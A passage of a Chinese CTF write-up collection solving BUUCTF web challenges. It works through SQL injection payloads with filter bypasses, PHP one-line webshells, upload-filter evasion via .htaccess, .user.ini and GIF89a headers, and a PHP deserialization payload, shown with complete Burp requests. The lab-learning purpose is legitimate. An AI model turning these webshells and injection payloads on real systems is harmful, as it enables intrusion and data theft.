C9ib2R5PgoKPC9odG1sPgo=
```

用`Burp Suite pro`的`Decoder`进行`Base64`解码得到：

```
<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <title>FLAG</title>
    </head>
    <body style="background-color:black;"><br><br><br><br><br><br>
        <h1 style="font-family:verdana;color:red;text-align:center;">ååï¼ä½ æ¾å°æäºï¼å¯æ¯ä½ çä¸å°æQAQ~~~</h1><br><br><br>
        
        <p style="font-family:arial;color:red;font-size:20px;text-align:center;">
            <?php
                echo "æå°±å¨è¿é";
                $flag = 'flag{853421f9-aab7-4f98-a77e-0dd03e1e7874}';
                $secret = 'jiAng_Luyuan_w4nts_a_g1rIfri3nd'
            ?>
        </p>
    </body>

</html>

```

提交`flag{853421f9-aab7-4f98-a77e-0dd03e1e7874}`即可。

------

### [极客大挑战 2019]LoveSQL

输入用户名和密码尝试注入。

```
admin' or 1=1#    // 用户名
6                 // 密码随便填
```

跳转页面`/check.php?username=admin%27+and+1%3D1%23&password=6`。

```
Login Success!
Hello admin！
Your password is '153c45348999cba120b33265dd3f7743
```

`/check.php?username=admin%27%20order%20by%203%23&password=6`查询字段数发现是`3`。

```
admin' order by 1#     // Login Success!
admin' order by 2#     // Login Success!
admin' order by 3#     // Login Success!
admin' order by 4#     // Unknown column '4' in 'order clause'
```

用`union`查询测试注入点（回显点位）：

```
1' union select 1,2,3#
```

得到回显点位为`2`和`3`。

```
Login Success!
Hello 2！
Your password is '3'
```

`/check.php?username=1%27%20union%20select%201%2Cdatabase%28%29%2Cversion%28%29%23&password=6`查询当前数据库名及版本，当前数据库为`geek`。

```
1' union select 1,database(),version()#

/check.php?username=1' union select 1,database(),version()%23&password=6

Login Success!
Hello geek！
Your password is '10.3.18-MariaDB'
```

`/check.php?username=1%27%20union%20select%201,%27Dad%27,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()%23&password=6`爆出当前数据库中的所有表名。

```
/check.php?username=1' union select 1,'Dad',group_concat(table_name) from information_schema.tables where table_schema=database()%23&password=6

Login Success!
Hello Dad！
Your password is 'geekuser,l0ve1ysq1'
```

`/check.php?username=1%27%20union%20select%201,%27Dad%27,group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=%27l0ve1ysq1%27%23&password=6`爆出`l0ve1ysq1`的字段。

```
/check.php?username=1' union select 1,'Dad',group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='l0ve1ysq1'%23&password=6

Login Success!
Hello Dad！
Your password is 'id,username,password'
```

`/check.php?username=1%27%20union%20select%201,%27Dad%27,group_concat(id,username,password)%20from%20l0ve1ysq1%23&password=6`爆数据。

```
/check.php?username=1' union select 1,'Dad',group_concat(id,username,password) from l0ve1ysq1%23&password=6

Hello Dad！
Your password is '1cl4ywo_tai_nan_le,2glzjinglzjin_wants_a_girlfriend,3Z4cHAr7zCrbiao_ge_dddd_hm,40xC4m3llinux_chuang_shi_ren,5Ayraina_rua_rain,6Akkoyan_shi_fu_de_mao_bo_he,7fouc5cl4y,8fouc5di_2_kuai_fu_ji,9fouc5di_3_kuai_fu_ji,10fouc5di_4_kuai_fu_ji,11fouc5di_5_kuai_fu_ji,12fouc5di_6_kuai_fu_ji,13fouc5di_7_kuai_fu_ji,14fouc5di_8_kuai_fu_ji,15leixiaoSyc_san_da_hacker,16flagflag{2a71b9a8-88dd-46ee-a6d4-c351c082366a}'
```

提交`flag{2a71b9a8-88dd-46ee-a6d4-c351c082366a}`即可。

------

### [极客大挑战 2019]Knife

靶机的网页标题叫白给的shell。

> 我家菜刀丢了，你能帮我找一下么
>
> eval($_POST["Syc"]);

用[AntSword](https://github.com/AntSwordProject/antSword)连接靶机，在根目录下发现`flag`，提交`flag{c9e79be6-2a09-48ef-bd6a-a8b9c6e88967}`即可。

------

### [极客大挑战 2019]Upload

文件上传题。编写一句话木马，上传`.php`文件后显示**Not image!**

```php
<?php @eval($_POST['shell']) ?>
```

抓包修改`Content-Type`字段为`image/jpeg`进行绕过，上传后显示**NOT! php!**

`.php`文件被拦截了，修改PHP后缀进行绕过，上传`.phtml	`文件后显示**NO! HACKER! your file included '<?'**

```
php3、php4、php5、php7、php8、phpt、phps、phtml
```

发现`<?`被靶机检测出来了，修改一句话木马：

```php
<script language="php">eval($_REQUEST[shell])</script>
```

抓包修改`Content-Type`字段为`image/jpeg`，上传`.phtml	`文件后显示**Don't lie to me, it's not image at all!!!**

添加文件头`GIF89a?`后，重新上传`.phtml	`文件显示**上传文件名: wdnmd.phtml**。唯独你没懂。

```php
GIF89a?<script language="php">eval($_REQUEST[shell])</script>
```

用[AntSword](https://github.com/AntSwordProject/antSword)连接`ip/upload/wdnmd.phtml`，在根目录下发现`flag`，提交`flag{5d49bb79-1b31-4bbc-a816-d1114e9b079a}`即可。

------

### [ACTF2020 新生赛]Upload

文件上传题。编写一句话木马，选择`.php`文件上传，提示该文件不允许上传，请上传`jpg`、`png`、`gif`结尾的图片噢！

```php
GIF89a?<script language="php">eval($_REQUEST[shell])</script>
```

将后缀改为`.gif`上传，抓包修改文件后缀为`phtml`。

```
Upload Success! Look here~ ./uplo4d/ff66b3e97751db68e9248c93806c7119.phtml
```

用[AntSword](https://github.com/AntSwordProject/antSword)连接`ip/uplo4d/ff66b3e97751db68e9248c93806c7119.phtml`，提交`flag{12f15e79-affb-4be1-ad63-ed58341991bc}`。

------

### BUU UPLOAD COURSE 1

打开靶机，网页能上传文件，并且有行文字说明“文件会被上传到 ./uploads”。随便上传点什么吧，新建一个`php`文件，内容为`<?php @eval("echo 'Hello';")?>`。上传成功后，靶机显示“文件已储存在: uploads/68cfe47bc11bc.jpg”，这说明靶机自动修改了后缀。来都来了，先看看吧。访问`/index.php?file=uploads/68cfe47bc11bc.jpg`，可以看到页面上有文字Hello，这说明靶机虽然修改了后缀但是仍然能够执行`PHP`代码。马上安排一句话木马，新建一个`php`文件，内容为`<?php @eval($_POST['shell']) ?>`。上传成功后，靶机显示“文件已储存在: uploads/68cfe33b7b3f1.jpg”。打开`AntSword`，添加数据，URL地址为`靶机/index.php?file=uploads/68cfe33b7b3f1.jpg`，连接密码为`shell`，点击测试连接提示连接成功。连接成功后可以在根目录看到`flag`文件，提交`flag`中的内容即可。

------

### [MRCTF2020]你传你🐎呢

打开靶机，可以看到一张英雄联盟的游戏截图和孙笑川的照片。直接上传`.php`文件显示：

> 我扌your problem?

上传失败了，靶机限制了可以上传的文件类型。通过对可上传的文件类型进行 fuzzing，我们可以发现能上传`.jpg`，`.png`，`.html`和`.htaccess`文件。PHP相关文件是不能上传的。

既然可以上传`.htaccess`文件，那就能让后端将所有`.jpg`文件都当作`PHP`文件进行处理。

```htaccess
AddType application/x-httpd-php .jpg
```

将上述内容写入`.htaccess`文件进行上传。

```html
POST /upload.php HTTP/1.1
Host: 43c7bfcd-a5de-483b-8eb6-8498d0fdf37b.node5.buuoj.cn:81
Content-Length: 379
Cache-Control: max-age=0
Accept-Language: zh-CN,zh;q=0.9
Origin: http://43c7bfcd-a5de-483b-8eb6-8498d0fdf37b.node5.buuoj.cn:81
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryurys2vleWNueTN13
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://43c7bfcd-a5de-483b-8eb6-8498d0fdf37b.node5.buuoj.cn:81/
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=adf2fe12883990c060a4a922d7317153
Connection: keep-alive

------WebKitFormBoundaryurys2vleWNueTN13
Content-Disposition: form-data; name="uploaded"; filename=".htaccess"
Content-Type: image/jpeg

AddType application/x-httpd-php .jpg
------WebKitFormBoundaryurys2vleWNueTN13
Content-Disposition: form-data; name="submit"

一键去世
------WebKitFormBoundaryurys2vleWNueTN13--
```

文件上传成功后，网页显示信息如下：

> Warning: mkdir(): File exists in /var/www/html/upload.php on line 23
>
> /var/www/html/upload/a53eae37058c5b2e2fe267b8d7229b93/.htaccess succesfully uploaded!

随后，我们上传一个写入`PHP Webshell`的`jpg`文件，当用户访问该`jpg`文件时，就能自动生成`shell.php`文件。先将以下代码写入`a.php`文件中。

```php
<?php fputs(fopen("./shell.php", "w"), "<?php @eval($_POST['shell']) ?>"); ?>
```

用`Burp Suite`将其文件类型修改为`image/jpeg`，文件名也修改为`a.jpg`。

```html
POST /upload.php HTTP/1.1
Host: 43c7bfcd-a5de-483b-8eb6-8498d0fdf37b.node5.buuoj.cn:81
Content-Length: 377
Cache-Control: max-age=0
Accept-Language: zh-CN,zh;q=0.9
Origin: http://43c7bfcd-a5de-483b-8eb6-8498d0fdf37b.node5.buuoj.cn:81
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywqoMrtSyNb3BHY9T
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://43c7bfcd-a5de-483b-8eb6-8498d0fdf37b.node5.buuoj.cn:81/
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=adf2fe12883990c060a4a922d7317153
Connection: keep-alive

------WebKitFormBoundarywqoMrtSyNb3BHY9T
Content-Disposition: form-data; name="uploaded"; filename="a.jpg"
Content-Type: image/jpeg

<?php fputs(fopen("./shell.php", "w"), '<?php @eval($_POST['shell']) ?>'); ?>
------WebKitFormBoundarywqoMrtSyNb3BHY9T
Content-Disposition: form-data; name="submit"

一键去世
------WebKitFormBoundarywqoMrtSyNb3BHY9T--
```

文件上传成功后，网页显示信息如下：

> Warning: mkdir(): File exists in /var/www/html/upload.php on line 23
> /var/www/html/upload/a53eae37058c5b2e2fe267b8d7229b93/a.jpg succesfully uploaded!

先用浏览器访问该文件`a.jpg`，靶机会如我们所愿生成`shell.php`文件，用`AntSword`连接靶机，可以看到`shell.php`文件内容为PHP一句话木马，且在靶机根目录存在`flag`文件。

![](https://paper.tanyaodan.com/BUUCTF/mrctf2020_upload.jpg)

------

### [GXYCTF2019]BabyUpload

上传`.htaccess`文件，让后端将所有`.jpg`文件都当作`PHP`文件进行处理。

```htaccess
AddType application/x-httpd-php .jpg
```

将上述内容写入`.htaccess`文件进行上传。

```
POST / HTTP/1.1
Host: caf37f3c-89c3-4390-892a-2c41f59627d0.node5.buuoj.cn:81
Content-Length: 336
Cache-Control: max-age=0
Origin: http://caf37f3c-89c3-4390-892a-2c41f59627d0.node5.buuoj.cn:81
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoqf5jeYTTG3qqsUY
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://caf37f3c-89c3-4390-892a-2c41f59627d0.node5.buuoj.cn:81/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: PHPSESSID=eaebdd1ab20fb7bb023a666dd1d0b639
Connection: keep-alive

------WebKitFormBoundaryoqf5jeYTTG3qqsUY
Content-Disposition: form-data; name="uploaded"; filename=".htaccess"
Content-Type: image/jpeg

AddType application/x-httpd-php .jpg
------WebKitFormBoundaryoqf5jeYTTG3qqsUY
Content-Disposition: form-data; name="submit"

上传
------WebKitFormBoundaryoqf5jeYTTG3qqsUY--
```

文件上传成功后，网页显示信息如下：

> /var/www/html/upload/0c80df51c2288c1304a7b1190c0aa12d/.htaccess succesfully uploaded!

我们继续用上一道题的方法，上传一个写入`PHP Webshell`的`jpg`文件，当用户访问该`jpg`文件时，就能自动生成`shell.php`文件。先将以下代码写入`a.php`文件中。

```php
<?php fputs(fopen("./shell.php", "w"), '<?php @eval($_POST[shell]) ?>'); ?>
```

用`Burp Suite`将其文件类型修改为`image/jpeg`，文件名也修改为`1.jpg`。

```
POST / HTTP/1.1
Host: caf37f3c-89c3-4390-892a-2c41f59627d0.node5.buuoj.cn:81
Content-Length: 373
Cache-Control: max-age=0
Origin: http://698aa538-23bd-474a-b657-566d29a40953.node5.buuoj.cn:81
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx5oRtk3mKa6F7XGc
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://698aa538-23bd-474a-b657-566d29a40953.node5.buuoj.cn:81/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: PHPSESSID=3f660413cccbf827d02d3864b3a32bfc
Connection: keep-alive

------WebKitFormBoundaryx5oRtk3mKa6F7XGc
Content-Disposition: form-data; name="uploaded"; filename="1.jpg"
Content-Type: image/jpeg

<?php fputs(fopen("./shell.php", "w"), "<?php @eval($_POST['shell']) ?>"); ?>
------WebKitFormBoundaryx5oRtk3mKa6F7XGc
Content-Disposition: form-data; name="submit"

上传
------WebKitFormBoundaryx5oRtk3mKa6F7XGc--
```

结果上传失败，网页显示信息：

> 诶，别蒙我啊，这标志明显还是php啊

那直接上传`.jpg`后缀的一句话木马文件。

```js
<script language="php">@eval($_POST['shell'])</script>
```

用`Burp Suite`将其文件类型修改为`image/jpeg`，文件名也修改为`1.jpg`。

```
POST / HTTP/1.1
Host: caf37f3c-89c3-4390-892a-2c41f59627d0.node5.buuoj.cn:81
Content-Length: 350
Cache-Control: max-age=0
Origin: http://caf37f3c-89c3-4390-892a-2c41f59627d0.node5.buuoj.cn:81
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryZO1P0zAAsKMQLxcC
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://caf37f3c-89c3-4390-892a-2c41f59627d0.node5.buuoj.cn:81/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: PHPSESSID=eaebdd1ab20fb7bb023a666dd1d0b639
Connection: keep-alive

------WebKitFormBoundaryZO1P0zAAsKMQLxcC
Content-Disposition: form-data; name="uploaded"; filename="1.jpg"
Content-Type: image/jpeg

<script language="php">@eval($_POST['shell']);</script>
------WebKitFormBoundaryZO1P0zAAsKMQLxcC
Content-Disposition: form-data; name="submit"

上传
------WebKitFormBoundaryZO1P0zAAsKMQLxcC--
```

文件上传成功后，网页显示信息如下：

> /var/www/html/upload/0c80df51c2288c1304a7b1190c0aa12d/1.jpg succesfully uploaded!

用`AntSword`连接后，在`/flag`文件中成功拿到`flag{328870e7-46c1-445d-80cf-ba5b3f3d96e2}`。

------

### [SUCTF 2019]CheckIn

直接上传`.php`文件会显示 illegal suffix!，而上传`.htaccess`文件会显示 exif_imagetype:not image!。

```htaccess
AddType application/x-httpd-php .jpg
```

修改`.htaccess`文件内容，针对所有匹配`.jpg`扩展名的文件，将它们当作`PHP`脚本执行。

```htaccess
#define width 16
#define height 7
<FilesMatch "\.jpg">
    SetHandler application/x-httpd-php
</FilesMatch>
```

用`Burp Suite`抓包修改`Content-Type: image/jpeg`后上传成功。

```
POST /index.php HTTP/1.1
Host: 8d3fac92-bcdf-465e-b252-6e1ebc80e7cf.node5.buuoj.cn:81
Content-Length: 413
Cache-Control: max-age=0
Origin: http://8d3fac92-bcdf-465e-b252-6e1ebc80e7cf.node5.buuoj.cn:81
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryqJGf9Dmj9bGkFTKT
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://8d3fac92-bcdf-465e-b252-6e1ebc80e7cf.node5.buuoj.cn:81/index.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: keep-alive

------WebKitFormBoundaryqJGf9Dmj9bGkFTKT
Content-Disposition: form-data; name="fileUpload"; filename=".htaccess"
Content-Type: image/jpeg

#define width 16
#define height 7
<FilesMatch "\.jpg">
    SetHandler application/x-httpd-php
</FilesMatch>
------WebKitFormBoundaryqJGf9Dmj9bGkFTKT
Content-Disposition: form-data; name="upload"

提交
------WebKitFormBoundaryqJGf9Dmj9bGkFTKT--
```

上传成功后，靶机显示信息如下：

> Your dir uploads/331f5a2fec4659f9c8cd3a470a780b69
> Your files :
> array(4) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(9) ".htaccess" [3]=> string(9) "index.php" }

用`Burp Suite`修改`.php`后缀为`.jpg`后还是上传失败，需要添加图片文件头标识`GIF89a`绕过。

```
POST /index.php HTTP/1.1
Host: 8d3fac92-bcdf-465e-b252-6e1ebc80e7cf.node5.buuoj.cn:81
Content-Length: 361
Cache-Control: max-age=0
Origin: http://8d3fac92-bcdf-465e-b252-6e1ebc80e7cf.node5.buuoj.cn:81
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary65XygUUzNRcwaLhd
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://8d3fac92-bcdf-465e-b252-6e1ebc80e7cf.node5.buuoj.cn:81/index.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: keep-alive

------WebKitFormBoundary65XygUUzNRcwaLhd
Content-Disposition: form-data; name="fileUpload"; filename="1.jpg"
Content-Type: image/jpeg

GIF89a
<script language="php">@eval($_POST['shell']);</script>
------WebKitFormBoundary65XygUUzNRcwaLhd
Content-Disposition: form-data; name="upload"

提交
------WebKitFormBoundary65XygUUzNRcwaLhd--
```

上传成功后，靶机信息如下：

> Your dir uploads/331f5a2fec4659f9c8cd3a470a780b69
> Your files :
> array(5) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(9) ".htaccess" [3]=> string(5) "1.jpg" [4]=> string(9) "index.php" }

用`AntSword`连接靶机失败。尝试使用`.user.ini`服务器配置文件解析图片木马，该配置文件的漏洞在于能够通过更改服务器配置项进而执行程序。`php.ini`中的配置项`auto_prepend_file`相当于`require()`函数，能够执行函数里面的`php`文件 ，该配置文件的作用在于执行`php`文件时，会默认优先扫描该文件所在目录下的`ini`文件。

> #### .user.ini 和 .htaccess 区别
>
> - 适用范围：.htaccess 仅用于 Apache；.user.ini 支持 Apache、Nginx 等（PHP 5.3.0 + 、fastcgi 模式 ）。
> - 功能侧重：.htaccess 是 Apache 目录网页配置，实现重定向、权限控制等；.user.ini 主要自定义 PHP 配置，常用于构造后门 。
> - 生效机制：.htaccess 需开启 AllowOverride，遍历目录查找，影响性能；.user.ini 从执行文件目录向上扫，满足条件（PHP 版本等 ）修改即生效 。
> - 使用限制：.htaccess 受 AllowOverride 限制，主配置可改时不建议用；.user.ini 依赖同目录 .php 文件，且仅识别部分模式配置 。

```
GIF89a
auto_prepend_file=1.jpg
```

将`user.ini`文件上传后，配置项`auto_prepend_file=1.jpg`会将其添加到文件上传目录的`index.php`中。同样需要抓包修改`Content-Type: image/jpeg`才能上传成功。

```
POST /index.php HTTP/1.1
Host: 8d3fac92-bcdf-465e-b252-6e1ebc80e7cf.node5.buuoj.cn:81
Content-Length: 333
Cache-Control: max-age=0
Origin: http://8d3fac92-bcdf-465e-b252-6e1ebc80e7cf.node5.buuoj.cn:81
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1HRSQkpaJ1wSpN9D
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://8d3fac92-bcdf-465e-b252-6e1ebc80e7cf.node5.buuoj.cn:81/index.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: keep-alive

------WebKitFormBoundary1HRSQkpaJ1wSpN9D
Content-Disposition: form-data; name="fileUpload"; filename=".user.ini"
Content-Type: image/jpeg

GIF89a
auto_prepend_file=1.jpg
------WebKitFormBoundary1HRSQkpaJ1wSpN9D
Content-Disposition: form-data; name="upload"

提交
------WebKitFormBoundary1HRSQkpaJ1wSpN9D--
```

上传成功后，靶机信息如下：

> Your dir uploads/331f5a2fec4659f9c8cd3a470a780b69
> Your files :
> array(6) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(9) ".htaccess" [3]=> string(9) ".user.ini" [4]=> string(5) "1.jpg" [5]=> string(9) "index.php" }

访问`uploads/331f5a2fec4659f9c8cd3a470a780b69`，可以看到`GIF89a`。我们用`HackBar`构造`POST`请求，传递参数`shell=phpinfo();`可以在靶机看到`PHP`相关信息。

传递参数`shell=var_dump(scandir("/"));`可以查看靶机的根目录信息。

> GIF89a array(31) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(10) ".dockerenv" [3]=> string(16) ".supervisor.sock" [4]=> string(3) "app" [5]=> string(3) "bin" [6]=> string(4) "boot" [7]=> string(8) "clean.sh" [8]=> string(3) "dev" [9]=> string(13) "docker.stderr" [10]=> string(13) "docker.stdout" [11]=> string(10) "entrypoint" [12]=> string(14) "entrypoint.cmd" [13]=> string(12) "entrypoint.d" [14]=> string(3) "etc" [15]=> string(4) "flag" [16]=> string(4) "home" [17]=> string(3) "lib" [18]=> string(5) "lib64" [19]=> string(5) "media" [20]=> string(3) "mnt" [21]=> string(3) "opt" [22]=> string(4) "proc" [23]=> string(4) "root" [24]=> string(3) "run" [25]=> string(4) "sbin" [26]=> string(3) "srv" [27]=> string(3) "sys" [28]=> string(3) "tmp" [29]=> string(3) "usr" [30]=> string(3) "var" }

传递参数`shell=var_dump(file_get_contents("/flag"));`可以获取`/flag`文件的内容信息。

> GIF89a string(43) "flag{d9ea66d6-5451-481b-b31f-98e0845cc879} "

------

### [极客大挑战 2019]BabySQL

简单地尝试下：

```
1' or '1'='1 #     // NO,Wrong username password！！！

1' or 1=1 #       // Error! You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '1=1' and password='1'' at line 1
```

根据错误信息可知or被直接过滤删除了，尝试双写oorr，好家伙！

```
1' oorr 1=1 #    // Login Success!
```

用`union`查询测试注入点（回显点位）：

```
1' union select 1,2,3 # // You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '1,2,3 #' and password='1'' at line 1

1' ununionion seselectlect 1,2,3 # // Login Success!
```

得到回显点位为`2`和`3`。

```
/check.php?username=1' ununionion seselectlect 1,2,3%23&password=6

Login Success!
Hello 2！
Your password is '3'
```

查询到当前数据库为`geek`。

```
/check.php?username=1' ununionion seselectlect 1,'Dad',database()%23&password=6

Login Success!
Hello Dad！
Your password is 'geek'
```

爆出所有的数据库。

```
/check.php?username=1' ununionion seselectlect 1,'Dad',group_concat(schema_name)frfromom
(infoorrmation_schema.schemata)%23&password=6

Login Success!
Hello Dad！
Your password is 'information_schema,mysql,performance_schema,test,ctf,geek'
```

爆出`Flag`表中的字段。

```
/check.php?username=1' ununionion seselectlect 1,'Dad',group_concat(column_name) frfromom (infoorrmation_schema.columns) whwhereere table_name="Flag" %23&password=6

Login Success!
Hello Dad！
Your password is 'flag'
```

爆出`flag`字段中的数据，得到`flag{76f8ba35-4123-46d5-8a3e-2b034065588f}`。

```
/check.php?username=1' ununionion seselectlect 1,'Dad',group_concat(flag)frfromom(ctf.Flag) %23&password=6

Login Success!
Hello Dad！
Your password is 'flag{76f8ba35-4123-46d5-8a3e-2b034065588f}'
```

------

### [网鼎杯 2020 青龙组]AreUSerialz

进入靶机后，页面信息如下，代码审计题，并且是`PHP`反序列化漏洞题。

```php
<?php
include("flag.php");
highlight_file(__FILE__);

class FileHandler {

    protected $op;
    protected $filename;
    protected $content;

    function __construct() {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process();
    }

    public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }

    private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            if($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }

    private function read() {
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }

    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }

    function __destruct() {
        if($this->op === "2")
            $this->op = "1";
        $this->content = "";
        $this->process();
    }

}

function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}

if(isset($_GET{'str'})) {
    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str);
    }
}
```

该题目提供了一个 `FileHandler` 类，包含 `op`、`filename` 和 `content` 三个`protected`属性的变量。核心逻辑涉及反序列化过程中自动调用的 `__destruct()` 方法，以及通过弱类型比较绕过安全检查来读取任意文件（如 `flag.php`）。

关键漏洞点分析：

- **`__destruct()` 方法的强类型比较**‌：
  - 在对象销毁时，`__destruct()` 会检查 `$this->op === "2"`（强类型比较）。如果 `op` 的值是字符串 `"2"`，则将其重置为 `"1"` 并执行 `process()`，导致读取文件的操作被跳过。
  - ‌**绕过方式**‌：由于 `process()` 中的比较是弱类型（`$this->op == "1"`），只需将 `op` 设为数字 `2`（如 `i:2`），即可在弱比较中触发 `read()` 函数。
- ‌**`protected` 属性的序列化问题**‌：
  - `protected` 属性在序列化时会包含空字符（`\0`），而题目通过 `is_valid()` 函数过滤不可打印字符（ASCII 32-125），导致直接序列化失败。
  - ‌**绕过方式**‌：
    - 利用 PHP 7.1+ 对变量类型不敏感的特性，将 `protected` 改为 `public`，避免空字符插入。
    - 或通过替换序列化字符串中的 `s:` 为 `S:`（十六进制表示），并用 `\00` 替代空字符，绕过校验。
- ‌**文件读取与输出**‌：
  - `read()` 方法使用 `file_get_contents()` 读取文件，但内容不会直接输出。需结合 `php://filter` 协议（如 `convert.base64-encode`）编码输出，或通过 `filter` 协议读取源码。

构造`payload`时，需要赋值`op=2`，`filename=flag.php`，并绕过字符校验。修改`FileHandler`如下：

```php
<?php
	class FileHandler {
		public $op = 2;
		public $filename = "flag.php";
		public $content = "";
	}
	$a = new FileHandler();
	echo(serialize($a));
?>
// O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";s:0:"";}
```

因为`file_get_contents()`是支持`php`伪协议的，所以能传入`filter`将`flag.php`的源码以`base64`编码的形式读取出来，即`php://filter/read=convert.base64-encode/resource=flag.php`。修改代码如下，当然也可以直接修改上述代码的`filename`。

```php
<?php
class FileHandler {
    public $op;
    public $filename;
    public $content;
    
    function __construct($op,$filename,$content) {
        $this->op=$op;
        $this->filename=$filename;
        $this->content=$content;
    }
}

$a = new FileHandler(2,'flag.php','');
echo serialize($a);
// O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";s:0:"";}
$b = new FileHandler(2,'php://filter/read=convert.base64-encode/resource=flag.php','');
echo "<br>";
echo serialize($b);
// O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";s:7:"content";s:0:"";}
```

`GET`请求传递参数`str=O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";s:7:"content";s:0:"";}`，可以看到靶机页面如下：

> [Result]:
> PD9waHAgJGZsYWc9J2ZsYWd7MzU3ODI1ZjctNzMzMy00ZDg4LTk2ZDktMzBlZThlN2U0YmQ2fSc7Cg==

直接在`cmd`命令行用`php -r "var_dump(base64_decode(''));"`进行`base64`解码，得到`flag`信息。

```bash
C:\Users\tyd>php -r "var_dump(base64_decode('PD9waHAgJGZsYWc9J2ZsYWd7MzU3ODI1ZjctNzMzMy00ZDg4LTk2ZDktMzBlZThlN2U0YmQ2fSc7Cg=='));"
